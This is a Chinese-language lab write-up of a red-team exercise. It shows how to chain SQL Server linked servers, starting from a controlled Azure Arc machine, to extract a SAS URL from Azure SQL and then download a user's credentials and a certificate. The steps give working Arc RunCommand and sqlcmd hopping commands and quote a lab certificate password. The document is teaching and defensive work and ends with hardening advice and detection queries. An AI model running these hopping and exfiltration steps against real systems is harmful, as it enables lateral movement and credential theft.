# Learning Objective 17：SQL 链接服务器跳板攻击与数据渗漏

> **摘要**：本实验基于 Lab Manual PDF（第 119 页至第 122 页），主要演示如何利用 SQL Server 链接服务器（Linked Servers）机制进行多跳数据库攻击（Database Hopping），从被控的 Azure Arc 服务器出发，穿透多层信任关系，最终从云端 Azure SQL 数据库中提取敏感数据。

---

## 目录

1. [核心目标](#核心目标)
2. [攻击背景与前置条件](#攻击背景与前置条件)
3. [理论基础](#理论基础)
4. [实验条件与环境要求](#实验条件与环境要求)
5. [详细步骤与原理分析](#详细步骤与原理分析)
6. [防御建议](#防御建议)
7. [参考资料](#参考资料)

---

## 核心目标

本实验的攻击链条如下：

```
攻击者 → Azure Arc (FF-MACHINE) → Linked Server (EDI) → Azure SQL (AZURESQL) → Blob Storage
```

### 具体目标

| 阶段 | 目标 | 说明 |
|------|------|------|
| **发现信任链** | 识别链接服务器关系 | 在被控的 Arc 服务器上发现与 EDI 服务器的链接信任 |
| **多跳探测** | 延伸攻击面 | 通过 EDI 服务器发现连接到 Azure SQL 数据库的链接 |
| **数据窃取** | 提取敏感数据 | 利用信任链从 Azure SQL 中获取 SAS URL |
| **凭据获取** | 下阶段准备 | 使用 SAS URL 访问存储账户，下载 LyndiaRMullins 的凭据和证书 |

---

## 攻击背景与前置条件

### 前置依赖

本实验是 **Objective 16** 的延续。在 [target16.md](target16.md) 中，我们实现了：

1. **获取 Azure Arc 控制权**：通过 Azure Lighthouse 跨租户管理，获得对 `ff-machine` 的 `Azure Arc VMware VM Contributor` 权限
2. **建立 C2 通道**：利用 `New-AzConnectedMachineRunCommand` 实现远程命令执行能力
3. **确认 SQL Server**：发现目标服务器运行 SQL Server 服务

### 攻击价值

通过本次攻击，我们将：
- 验证混合云环境中的数据库横向移动风险
- 演示如何通过合法的管理通道（Linked Servers）绕过网络边界
- 获取下一阶段攻击所需的高价值凭据

---

## 理论基础

### 1. SQL Server 链接服务器 (Linked Servers)

#### 机制原理

SQL Server 链接服务器允许一个 SQL Server 实例访问另一个 SQL Server 实例中的数据，实现分布式查询。

**配置方式**：

```sql
-- 创建链接服务器
EXEC sp_addlinkedserver
    @server = 'EDI',                    -- 链接服务器名称
    @srvproduct = 'SQL Server';         -- 产品类型

-- 配置身份验证
EXEC sp_addlinkedsrvlogin
    @rmtsrvname = 'EDI',
    @useself = 'TRUE';                  -- 使用当前安全上下文
    -- 或指定账号: @locallogin = 'local_user', @useself = 'FALSE', @rmtuser = 'remote_user', @rmtpassword = 'password'
```

#### 安全风险

| 风险类型 | 描述 | 影响 |
|----------|------|------|
| **权限传递** | 使用当前登录用户的安全上下文 | 如果本地账户有高权限，可访问远程敏感数据 |
| **信任链攻击** | A 信任 B，B 信任 C → 攻击者通过 A 访问 C | 实现多跳横向移动 |
| **凭据存储** | 部分配置在链接服务器中存储凭据 | 凭据泄露风险 |

#### 攻击技术：SQL Hopping

**原理**：利用链接服务器的信任关系，通过嵌套查询访问不可直接访问的数据库。

```sql
-- 直接查询（一跳）
SELECT * FROM [EDI].database.schema.table

-- 嵌套查询（多跳）
EXECUTE('SELECT * FROM [AZURESQL].database.schema.table') AT [EDI]
```

### 2. Azure Arc 作为 C2 通道

#### Run Command 机制

Azure Arc 的 `RunCommand` 功能允许通过云端 API 在已注册的服务器上执行命令。

**架构图**：

```
┌─────────────────┐         HTTPS API          ┌──────────────────┐
│   攻击者控制台   │ ──────────────────────────> │   Azure Arc 服务  │
│  (PowerShell)   │                             │  (控制平面)       │
└─────────────────┘                             └──────────────────┘
                                                         │
                                                         │ 代理通信
                                                         ▼
                                                ┌──────────────────┐
                                                │  FF-MACHINE      │
                                                │  (Arc Agent)     │
                                                │  执行: sqlcmd    │
                                                └──────────────────┘
```

#### 优势

- **绕过防火墙**：仅需出站 HTTPS 连接（通常端口 443），无需入站访问
- **持久化**：只要 Arc 代理运行，即可持续执行命令
- **隐蔽性**：流量看似正常的 Arc 管理流量

### 3. SAS (Shared Access Signature) 令牌

#### 原理

SAS 令牌是对 Azure Storage 资源的有限权限委托，包含签名、过期时间和权限范围。

**URL 结构**：

```
https://<account>.blob.core.windows.net/<container>/<file>?sv=<storage-version>&ss=<service>&srt=<resource-type>&sp=<permission>&se=<expiry-time>&s_sig=<signature>
```

#### 攻击价值

- **密钥无关访问**：无需存储账户密钥即可访问
- **权限范围**：可能包含读取、写入、删除等权限
- **时间窗口**：在有效期内可重复使用

---

## 实验条件与环境要求

### 必要条件

| 条件 | 原因 | 验证方法 |
|------|------|----------|
| **Azure Arc 访问权限** | 需要执行远程命令 | `Get-AzRoleAssignment` 显示 `Azure Arc VMware VM Contributor` |
| **SQL Server 运行中** | 链接服务器功能依赖 | `New-AzConnectedMachineRunCommand -SourceScript "net start \ Select-String 'SQL'"` |
| **链接服务器配置存在** | 攻击目标 | `SELECT name FROM sys.servers` 返回非空结果 |
| **网络连接可用** | Arc 代理需要通信 | `az connectedmachine show --machine-name ff-machine` 状态为 "Connected" |

### 环境架构

```
┌─────────────────────────────────────────────────────────────────┐
│                        云端攻击者环境                            │
│  - PowerShell with Az.ConnectedMachine module                   │
│  - 有效的 Access Token (来自 Obj 15/16)                         │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼ Azure Arc RunCommand
┌─────────────────────────────────────────────────────────────────┐
│                    FF-MACHINE (本地服务器)                       │
│  - Azure Arc 代理已安装                                          │
│  - SQL Server 实例运行                                           │
│  - 链接到 EDI 服务器                                              │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼ Linked Server
┌─────────────────────────────────────────────────────────────────┐
│                       EDI (中间服务器)                           │
│  - SQL Server 实例                                               │
│  - 链接到 AZURESQL                                               │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼ Linked Server
┌─────────────────────────────────────────────────────────────────┐
│                 AZURESQL (云端数据库)                            │
│  - Azure SQL Database                                           │
│  - 数据库: oilcorp_logistics_database                           │
│  - 表: inventory (包含 SAS URL)                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 为什么需要这些条件？

1. **Azure Arc 访问权限**：这是攻击的入口点，没有此权限无法在远程服务器上执行命令
2. **SQL Server 运行中**：链接服务器是 SQL Server 的功能，如果服务未运行则无法利用
3. **链接服务器配置**：这是攻击的载体，没有配置则无法进行跳板攻击
4. **网络连接**：Arc 代理需要向 Azure 控制面报告状态和接收命令

---

## 详细步骤与原理分析

> **重要提示**：所有命令通过 Azure Arc `RunCommand` 执行，每个命令需要 **2-5 分钟**完成。

### 步骤 1：探测第一跳 - 发现 EDI 服务器

#### 目标
识别 `FF-MACHINE` 上的链接服务器配置。

#### 命令

```powershell
New-AzConnectedMachineRunCommand `
    -MachineName 'ff-machine' `
    -ResourceGroupName 'FFDBMachineRG' `
    -RunCommandName 'ReconStep1' `
    -Location 'East US' `
    -SourceScript "sqlcmd -S FF-MACHINE -Q `"EXECUTE ('Select name from sys.servers')`""
```

#### 原理分析

- **`sys.servers`**：系统视图，存储所有链接服务器的配置信息
- **`EXECUTE(...)`**：动态 SQL 执行，用于构造可变查询
- **为什么先探测**：了解信任关系的"地形图"，规划攻击路径

#### 预期结果

```
name
----
FF-MACHINE
EDI
```

---

### 步骤 2：探测第二跳 - 发现 AZURESQL

#### 目标
通过 EDI 服务器发现其链接的 Azure SQL 数据库。

#### 命令

```powershell
New-AzConnectedMachineRunCommand `
    -MachineName 'ff-machine' `
    -ResourceGroupName 'FFDBMachineRG' `
    -RunCommandName 'ReconStep2' `
    -Location 'East US' `
    -SourceScript "sqlcmd -S FF-MACHINE -Q `"EXECUTE ('Select name from sys.servers') AT [EDI]`""
```

#### 原理分析

- **`AT [EDI]`**：T-SQL 语法，指定在远程链接服务器上执行命令
- **为什么使用 AT 子句**：实现"告诉 EDI 去执行"的效果，而不是直接连接 EDI
- **多跳原理**：
  1. 命令发送到 FF-MACHINE（通过 Arc）
  2. FF-MACHINE 连接到 EDI（使用链接服务器配置的凭据）
  3. EDI 执行查询并返回结果
  4. 结果通过 FF-MACHINE 传回攻击者

#### 预期结果

```
name
----
EDI
AZURESQL
```

---

### 步骤 3：枚举数据库与表结构

#### 3.1 列出数据库

```powershell
$ServerName = 'AZURESQL'
New-AzConnectedMachineRunCommand `
    -MachineName 'ff-machine' `
    -ResourceGroupName 'FFDBMachineRG' `
    -RunCommandName 'EnumDBs' `
    -Location 'East US' `
    -SourceScript "sqlcmd -S FF-MACHINE -Q `"EXECUTE ('sp_catalogs $ServerName') AT [EDI]`""
```

**原理解释**：
- **`sp_catalogs`**：系统存储过程，返回链接服务器上的数据库列表
- **为什么枚举**：了解目标数据库名称，为后续查询做准备

#### 3.2 列出表

```powershell
$DBName = 'oilcorp_logistics_database'
New-AzConnectedMachineRunCommand `
    -MachineName 'ff-machine' `
    -ResourceGroupName 'FFDBMachineRG' `
    -RunCommandName 'EnumTables' `
    -Location 'East US' `
    -SourceScript "sqlcmd -S FF-MACHINE -Q `"EXECUTE ('sp_tables_ex @table_server = `$ServerName`, @table_catalog = `$DBName`) AT [EDI]`""
```

**原理解释**：
- **`sp_tables_ex`**：扩展存储过程，用于枚举远程表
- **参数传递**：使用变量 `$ServerName` 和 `$DBName` 提高可读性
- **为什么枚举表**：确定包含敏感数据的目标表

#### 预期结果

```
TABLE_QUALIFIER                  TABLE_OWNER  TABLE_NAME
-------------------------------- ------------ -----------------
oilcorp_logistics_database       dbo          inventory
```

---

### 步骤 4：数据查询与渗漏

#### 命令

```powershell
New-AzConnectedMachineRunCommand `
    -MachineName 'ff-machine' `
    -ResourceGroupName 'FFDBMachineRG' `
    -RunCommandName 'DataExfil' `
    -Location 'East US' `
    -SourceScript "sqlcmd -S FF-MACHINE -Q `"EXECUTE ('SELECT * FROM [AZURESQL].[oilcorp_logistics_database].[dbo].[inventory]') AT [EDI]`""
```

#### 原理分析

- **四部分命名**：`[Server].[Database].[Schema].[Table]` 是 SQL Server 中引用对象的完整路径
- **嵌套执行**：整个查询路径为 `攻击者 → FF-MACHINE → EDI → AZURESQL`
- **为什么这样设计**：每一跳都使用合法的数据库链接功能，避免触发异常检测

#### 预期结果

```
id  product_name      sas_url
--- ----------------- --------------------------------------------------------------
1   ExpansionPlans    https://expansionplans.blob.core.windows.net/...?sv=2023-01-03&...
```

---

### 步骤 5：访问 Blob Storage

#### 目标
使用获取的 SAS URL 下载敏感文件。

#### 操作步骤

1. **打开 Azure Storage Explorer**
2. **连接到 Blob**：选择 "Connect via SAS URI"
3. **粘贴 SAS URL**：从步骤 4 获取的完整 URL
4. **浏览容器**：找到以下文件

| 文件名 | 内容 | 用途 |
|--------|------|------|
| `Credentials.txt` | LyndiaRMullins 的明文密码 | 下一阶段登录凭据 |
| `Miro_Certificate.pfx` | 证书文件 | 可能用于代码签名或身份验证 |
| `Confidential Details.txt` | 证书导出密码 `SecretPass@123` | 解锁证书文件 |

#### 为什么使用 SAS URL？

- **无需额外凭据**：SAS URL 已包含所有必要的认证信息
- **权限受限**：相比存储账户密钥，SAS 的权限范围和过期时间可控
- **隐蔽性强**：SAS 访问不会在存储账户审计中显示为"异常登录"

---

## 攻击链条总结

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           攻击链条可视化                                     │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  Obj 15: Web 会话劫持                                                       │
│    ↓                                                                        │
│  Obj 16: Azure Arc 控制获取 (target16.md)                                    │
│    ├─ Token 提取: 浏览器 → PowerShell                                       │
│    ├─ 架构识别: Azure Lighthouse + Azure Arc                                │
│    └─ 远程执行: New-AzConnectedMachineRunCommand                            │
│    ↓                                                                        │
│  Obj 17: SQL 链接服务器跳板 (本文档)                                          │
│    ├─ 跳板 1: FF-MACHINE → EDI                                              │
│    ├─ 跳板 2: EDI → AZURESQL                                                │
│    ├─ 数据渗漏: 获取 SAS URL                                                │
│    └─ 凭据获取: LyndiaRMullins 凭据 + 证书                                  │
│    ↓                                                                        │
│  后续攻击: (待定)                                                           │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 防御建议

### 1. 链接服务器安全加固

| 措施 | 实施方法 | 效果 |
|------|----------|------|
| **最小权限配置** | 使用专用低权限账号配置链接服务器 | 限制横向移动的攻击面 |
| **定期审计** | `SELECT * FROM sys.linked_logins` | 发现异常配置 |
| **禁用不必要的链接** | `sp_dropserver 'ServerName', 'droplogins'` | 减少攻击路径 |
| **使用证书认证** | 替代密码凭据 | 降低凭据泄露风险 |

### 2. Azure Arc 安全

| 措施 | 实施方法 | 参考 |
|------|----------|------|
| **限制 RunCommand 权限** | 使用自定义 RBAC 角色，不赋予 `Microsoft.HybridCompute/machines/runCommands/write` | [Azure Arc RBAC](https://learn.microsoft.com/en-us/azure/azure-arc/servers/manage-rbac) |
| **监控命令执行** | 配置 Microsoft Defender for Cloud | [Arc 安全最佳实践](https://learn.microsoft.com/en-us/azure/azure-arc/servers/security-best-practices) |
| **网络隔离** | 将 Arc 服务器置于专用子网，使用 NSG 限制出站 | [网络架构](https://learn.microsoft.com/en-us/azure/azure-arc/servers/network-architecture) |

### 3. 数据库防护

| 措施 | 实施方法 | 参考 |
|------|----------|------|
| **启用 Azure AD 认证** | 移除 SQL 认证，使用托管身份 | [Azure AD 认证](https://learn.microsoft.com/en-us/azure/azure-sql/database/authentication-aad-configure) |
| **数据库审计** | 启用 Azure SQL 审计，监控异常查询 | [SQL 审计](https://learn.microsoft.com/en-us/azure/azure-sql/database/auditing-overview) |
| **数据加密** | 透明数据加密 (TDE) + Always Encrypted | [数据加密](https://learn.microsoft.com/en-us/azure/azure-sql/database/transparent-data-encryption-tde-overview) |

### 4. 存储 SAS 安全

| 措施 | 实施方法 | 参考 |
|------|----------|------|
| **限制 SAS 权限** | 仅授予必要的权限（如只读） | [SAS 最佳实践](https://learn.microsoft.com/en-us/azure/storage/common/storage-sas-overview#best-practices-for-using-shared-access-signatures) |
| **设置短过期时间** | 避免"永久 SAS" | [SAS 管理](https://learn.microsoft.com/en-us/azure/storage/common/storage-sas-overview) |
| **使用存储访问策略** | 可撤销的 SAS | [访问策略](https://learn.microsoft.com/en-us/azure/storage/common/storage-sas-overview) |
| **监控 SAS 使用** | Azure Storage Analytics | [存储监控](https://learn.microsoft.com/en-us/azure/storage/common/storage-monitor-storage-account) |

### 5. 检测与响应

#### KQL 检测查询（Microsoft Sentinel）

```kusto
// 检测异常的链接服务器查询
let LinkedServerQueries = materialize(
    AzureDiagnostics
    | where Category == "SQLSecurityAuditEvents"
    | where statement_s contains "AT ["
    | project TimeGenerated, ServerName, DatabaseName, UserName, statement_s
);
// 检测来自 Azure Arc 的可疑命令执行
let ArcSuspiciousCommands = materialize(
    AzureActivity
    | where OperationNameValue == "Microsoft.HybridCompute/machines/runCommands/write"
    | where HttpRequestMethod == "PUT"
    | project TimeGenerated, Caller, CallerIpAddress, SubscriptionId, ResourceGroup
);
LinkedServerQueries
| join kind=inner ArcSuspiciousCommands on TimeGenerated
```

#### 检测指标

| 指标 | 检测方法 | 阈值 |
|------|----------|------|
| 链接服务器查询频率 | 审计日志分析 | 短时间内大量 AT [ 查询 |
| 异常来源 IP | Azure Activity Logs | 非 IT 管理网段 |
| SAS 生成频率 | Storage Analytics | 短时间内大量 SAS 创建 |
| 数据导出量 | Network Security Group Flow Logs | 异常流量峰值 |

---

## 参考资料

### 官方文档

| 主题 | 链接 | 描述 |
|------|------|------|
| **SQL Server 链接服务器** | [Create Linked Servers](https://learn.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine) | 配置和管理链接服务器 |
| **EXECUTE AT 语法** | [EXECUTE (Transact-SQL)](https://learn.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) | 远程执行命令的语法 |
| **Azure Arc Run Command** | [az connectedmachine run-command](https://learn.microsoft.com/en-us/cli/azure/connectedmachine/run-command) | Arc 命令执行 API |
| **Azure Lighthouse** | [Azure Lighthouse Overview](https://learn.microsoft.com/en-us/azure/lighthouse/overview) | 跨租户管理机制（Obj 16 参考） |
| **SAS 令牌** | [SAS Overview](https://learn.microsoft.com/en-us/azure/storage/common/storage-sas-overview) | 共享访问签名详解 |

### 项目内参考文件

| 文件 | 位置 | 相关内容 |
|------|------|----------|
| **target16.md** | [/target16.md](target16.md) | Azure Arc 控制获取前置实验 |
| **AADCSyncServiceAccount.md** | [/AADCSyncServiceAccount.md](AADCSyncServiceAccount.md) | 同步服务账户滥用（相关攻击面） |
| **LateralMovementADEID.md** | [/LateralMovementADEID.md](LateralMovementADEID.md) | 横向移动防御（相关防御策略） |

### 攻击技术映射（MITRE ATT&CK）

| 技术 | ID | 描述 |
|------|-----|------|
| **Valid Accounts** | T1078 | 使用合法账户访问系统 |
| **Remote Services** | T1021 | 通过远程服务横向移动 |
| **Data from Cloud Storage Object** | T1530 | 从云存储提取数据 |
| **Command and Scripting Interpreter** | T1059 | 使用 PowerShell/SQL 执行命令 |

### 社区资源

- [SQL Server Linked Server Security](https://www.mssqltips.com/sqlservertip/5697/sql-server-linked-servers-security-best-practices/)
- [Azure Arc Security Baseline](https://learn.microsoft.com/en-us/security/benchmark/azure/azure-arc-servers)

---

## 总结

本实验展示了混合云环境中一个完整的攻击链条：

1. **入口点**：通过 Azure Lighthouse 和 Azure Arc 获得初始访问
2. **横向移动**：利用 SQL Server 链接服务器实现数据库跳板
3. **数据渗漏**：提取存储在 Azure SQL 中的 SAS URL
4. **持久化**：获取下一阶段攻击所需的凭据和证书

**关键洞察**：
- 信任链（如链接服务器）是攻击者的重要攻击面
- 云管理工具（如 Azure Arc）可能成为 C2 通道
- 合法的管理功能（如 Run Command）可被滥用进行攻击
- 混合云环境的边界日益模糊，需要全面的防御策略

**防御重点**：
- 最小权限配置（链接服务器、RBAC）
- 持续审计和监控（数据库日志、Arc 活动）
- 网络隔离（限制出站、NSG 配置）
- 凭据保护（Azure AD 认证、托管身份）

---

> **实验记录日期**：2025-01-14
> **文档版本**：v1.0
> **基于**：Lab Manual PDF (第 119-122 页) + AzureAD-Attack-Defense-Frame 项目资料
